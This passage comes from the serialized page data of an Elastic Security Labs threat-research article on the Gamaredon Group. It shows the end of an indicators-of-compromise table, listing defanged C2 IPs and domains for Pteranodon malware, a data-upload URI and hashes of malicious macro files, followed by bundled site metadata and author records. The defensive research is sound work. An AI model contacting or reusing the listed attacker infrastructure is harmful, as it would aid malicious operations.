IP\"}),(0,t.jsx)(e.td,{children:\"141[.]8[.]192[.]153\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"System Information Upload IP\"}),(0,t.jsx)(e.td,{children:\"188[.]225[.]25[.]50\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"System Information Upload URI\"}),(0,t.jsx)(e.td,{children:\"libcrash.ddns[.]net/{Computername_SerialNumber}//posolreboot.php\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"ExcelMyMacros.vba SHA-256\"}),(0,t.jsx)(e.td,{children:\"c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"wordMacros.vba SHA-256\"}),(0,t.jsx)(e.td,{children:\"02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"ExcelMyMacros.txt SHA-256\"}),(0,t.jsx)(e.td,{children:\"2f310c5b16620d9f6e5d93db52607f21040b4829aa6110e22ac55fab659e9fa1\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon SHA-256\"}),(0,t.jsx)(e.td,{children:\"c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon SHA-256\"}),(0,t.jsx)(e.td,{children:\"145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon Domain\"}),(0,t.jsx)(e.td,{children:\"beercraft[.]space\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon Domain\"}),(0,t.jsx)(e.td,{children:\"skymage[.]fun\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon Domain\"}),(0,t.jsx)(e.td,{children:\"masseffect[.]space\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon Domain\"}),(0,t.jsx)(e.td,{children:\"masseffect[.]website\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon IP\"}),(0,t.jsx)(e.td,{children:\"185[.]200[.]241[.]88\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pteranodon IP\"}),(0,t.jsx)(e.td,{children:\"188[.]225[.]46[.]94\"})]})]})]})}),`\n`,(0,t.jsx)(e.h2,{id:\"references\",children:\"References\"}),`\n`,(0,t.jsxs)(e.ol,{children:[`\n`,(0,t.jsx)(e.li,{children:(0,t.jsx)(e.a,{href:\"https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine\",rel:\"nofollow\",children:\"https://www.anomali.com/resources/whitepapers/malicious-activity-aligning-with-gamaredon-ttps-targets-ukraine\"})}),`\n`]})]})}function S(n={}){let{wrapper:e}=n.components||{};return e?(0,t.jsx)(e,Object.assign({},n,{children:(0,t.jsx)(l,n)})):l(n)}var T=S;function x(n,e){throw new Error(\"Expected \"+(e?\"component\":\"object\")+\" `\"+n+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return b(D);})();\n;return Component;"},"_id":"articles/playing-defense-against-gamaredon-group.mdx","_raw":{"sourceFilePath":"articles/playing-defense-against-gamaredon-group.mdx","sourceFileName":"playing-defense-against-gamaredon-group.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/playing-defense-against-gamaredon-group"},"type":"Article","imageUrl":"/assets/images/playing-defense-against-gamaredon-group/blog-thumb-digital-shield.jpg","readingTime":"33 min read","series":"","url":"/playing-defense-against-gamaredon-group","headings":[{"level":2,"title":"Campaign Details","href":"#campaign-details"},{"level":2,"title":"Document metadata analysis","href":"#document-metadata-analysis"},{"level":2,"title":"Macro code analysis","href":"#macro-code-analysis"},{"level":2,"title":"Pteranodon update","href":"#pteranodon-update"},{"level":2,"title":"Detection crafting","href":"#detection-crafting"},{"level":3,"title":"Dynamic DNS","href":"#dynamic-dns"},{"level":3,"title":"Template Injection","href":"#template-injection"},{"level":3,"title":"Malicious registry configuration","href":"#malicious-registry-configuration"},{"level":3,"title":"Persistence startup","href":"#persistence-startup"},{"level":2,"title":"Conclusion","href":"#conclusion"},{"level":2,"title":"Indicators of Compromise (IOCs)","href":"#indicators-of-compromise-iocs"},{"level":2,"title":"References","href":"#references"}],"author":[{"title":"Daniel Stepanic","slug":"daniel-stepanic","description":"Elastic Security Labs Team Principal Security Researcher, Malware","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var i=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),g=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},s=(t,e,n,c)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of x(e))!f.call(t,a)\u0026\u0026a!==n\u0026\u0026i(t,a,{get:()=\u003ee[a],enumerable:!(c=p(e,a))||c.enumerable});return t};var j=(t,e,n)=\u003e(n=t!=null?m(d(t)):{},s(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),M=t=\u003es(i({},\"__esModule\",{value:!0}),t);var u=_((w,o)=\u003e{o.exports=_jsx_runtime});var b={};g(b,{default:()=\u003eS,frontmatter:()=\u003ey});var r=j(u()),y={title:\"Daniel Stepanic\",description:\"Elastic Security Labs Team Principal Security Researcher, Malware\",slug:\"daniel-stepanic\"};function l(t){return(0,r.jsx)(r.Fragment,{})}function D(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(l,t)})):l(t)}var S=D;return M(b);})();\n;return Component;"},"_id":"authors/daniel-stepanic.mdx","_raw":{"sourceFilePath":"authors/daniel-stepanic.mdx","sourceFileName":"daniel-stepanic.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/daniel-stepanic"},"type":"Author","imageUrl":"","url":"/authors/daniel-stepanic"},{"title":"Andrew Pease","slug":"andrew-pease","description":"Elastic Security Labs Technical Lead","image":"andrew-pease.jpg","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var s=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var f=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},c=(e,t,n,o)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let a of x(t))!l.call(e,a)\u0026\u0026a!==n\u0026\u0026s(e,a,{get:()=\u003et[a],enumerable:!(o=p(t,a))||o.enumerable});return e};var _=(e,t,n)=\u003e(n=e!=null?m(g(e)):{},c(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),w=e=\u003ec(s({},\"__esModule\",{value:!0}),e);var u=f((C,i)=\u003e{i.exports=_jsx_runtime});var h={};j(h,{default:()=\u003eb,frontmatter:()=\u003eL});var r=_(u()),L={title:\"Andrew Pease\",description:\"Elastic Security Labs Technical Lead\",slug:\"andrew-pease\",image:\"andrew-pease.jpg\"};function d(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(d,e)})):d(e)}var b=M;return w(h);})();\n;return Component;"},"_id":"authors/andrew-pease.mdx","_raw":{"sourceFilePath":"authors/andrew-pease.mdx","sourceFileName":"andrew-pease.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/andrew-pease"},"type":"Author","imageUrl":"/assets/images/authors/andrew-pease.jpg","url":"/authors/andrew-pease"},{"title":"Seth Goodwin","slug":"seth-goodwin","description":"Elastic Security Labs Team Senior Research Engineer, Intelligence","body":{"raw":"","code":"var Component=(()=\u003e{var g=Object.create;var i=Object.defineProperty;var l=Object.getOwnPropertyDescriptor;var x=Object.getOwnPropertyNames;var d=Object.getPrototypeOf,f=Object.prototype.hasOwnProperty;var _=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),h=(t,e)=\u003e{for(var n in e)i(t,n,{get:e[n],enumerable:!0})},a=(t,e,n,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of x(e))!f.call(t,o)\u0026\u0026o!==n\u0026\u0026i(t,o,{get:()=\u003ee[o],enumerable:!(s=l(e,o))||s.enumerable});return t};var j=(t,e,n)=\u003e(n=t!=null?g(d(t)):{},a(e||!t||!t.__esModule?i(n,\"default\",{value:t,enumerable:!0}):n,t)),p=t=\u003ea(i({},\"__esModule\",{value:!0}),t);var u=_((C,c)=\u003e{c.exports=_jsx_runtime});var b={};h(b,{default:()=\u003eS,frontmatter:()=\u003ew});var r=j(u()),w={title:\"Seth Goodwin\",description:\"Elastic Security Labs Team Senior Research Engineer, Intelligence\",slug:\"seth-goodwin\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var S=M;return p(b);})();\n;return Component;"},"_id":"authors/seth-goodwin.mdx","_raw":{"sourceFilePath":"authors/seth-goodwin.mdx","sourceFileName":"seth-goodwin.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/seth-goodwin"},"type":"Author","imageUrl":"","url":"/authors/seth-goodwin"},{"title":"Elastic Security Intelligence \u0026 Analytics Team","slug":"elastic-security-intelligence-analytics-team","body":{"raw":"","code":"var Component=(()=\u003e{var m=Object.create;var c=Object.defineProperty;var x=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,y=Object.prototype.hasOwnProperty;var _=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),j=(t,e)=\u003e{for(var n in e)c(t,n,{get:e[n],enumerable:!0})},s=(t,e,n,i)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let a of g(e))!y.call(t,a)\u0026\u0026a!==n\u0026\u0026c(t,a,{get:()=\u003ee[a],enumerable:!(i=x(e,a))||i.enumerable});return t};var d=(t,e,n)=\u003e(n=t!=null?m(f(t)):{},s(e||!t||!t.__esModule?c(n,\"default\",{value:t,enumerable:!0}):n,t)),p=t=\u003es(c({},\"__esModule\",{value:!0}),t);var l=_((b,o)=\u003e{o.exports=_jsx_runtime});var F={};j(F,{default:()=\u003eD,frontmatter:()=\u003eM});var r=d(l()),M={title:\"Elastic Security Intelligence \u0026 Analytics Team\",slug:\"elastic-security-intelligence-analytics-team\"};function u(t){return(0,r.jsx)(r.Fragment,{})}function C(t={}){let{wrapper:e}=t.components||{};return e?(0,r.jsx)(e,Object.assign({},t,{children:(0,r.jsx)(u,t)})):u(t)}var D=C;return p(F);})();\n;return Component;"},"_id":"authors/elastic-security-intelligence-analytics-team.mdx","_raw":{"sourceFilePath":"authors/elastic-security-intelligence-analytics-team.mdx","sourceFileName":"elastic-security-intelligence-analytics-team.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/elastic-security-intelligence-analytics-team"},"type":"Author","imageUrl":"","url":"/authors/elastic-security-intelligence-analytics-team"}],"category":[{"title":"Activity group","slug":"activity-group","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var a=Object.defineProperty;var g=Object.getOwnPropertyDescriptor;var f=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,_=Object.prototype.hasOwnProperty;var j=(t,n)=\u003e()=\u003e(n||t((n={exports:{}}).exports,n),n.exports),l=(t,n)=\u003e{for(var e in n)a(t,e,{get:n[e],enumerable:!0})},c=(t,n,e,i)=\u003e{if(n\u0026\u0026typeof n==\"object\"||typeof n==\"function\")for(let o of f(n))!_.call(t,o)\u0026\u0026o!==e\u0026\u0026a(t,o,{get:()=\u003en[o],enumerable:!(i=g(n,o))||i.enumerable});return t};var d=(t,n,e)=\u003e(e=t!=null?x(p(t)):{},c(n||!t||!t.__esModule?a(e,\"default\",{value:t,enumerable:!0}):e,t)),y=t=\u003ec(a({},\"__esModule\",{value:!0}),t);var u=j((X,s)=\u003e{s.exports=_jsx_runtime});var D={};l(D,{default:()=\u003eC,frontmatter:()=\u003eM});var r=d(u()),M={title:\"Activity group\",slug:\"activity-group\"};function m(t){return(0,r.jsx)(r.Fragment,{})}function v(t={}){let{wrapper:n}=t.components||{};return n?(0,r.jsx)(n,Object.assign({},t,{children:(0,r.jsx)(m,t)})):m(t)}var C=v;return y(D);})();\n;return Component;"},"_id":"categories/activity-group.mdx","_raw":{"sourceFilePath":"categories/activity-group.mdx","sourceFileName":"activity-group.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/activity-group"},"type":"Category","url":"/categories/activity-group"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"playing-defense-against-gamaredon-group"},"buildId":"zgtdq_G6IdLL0e41oqL5l","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>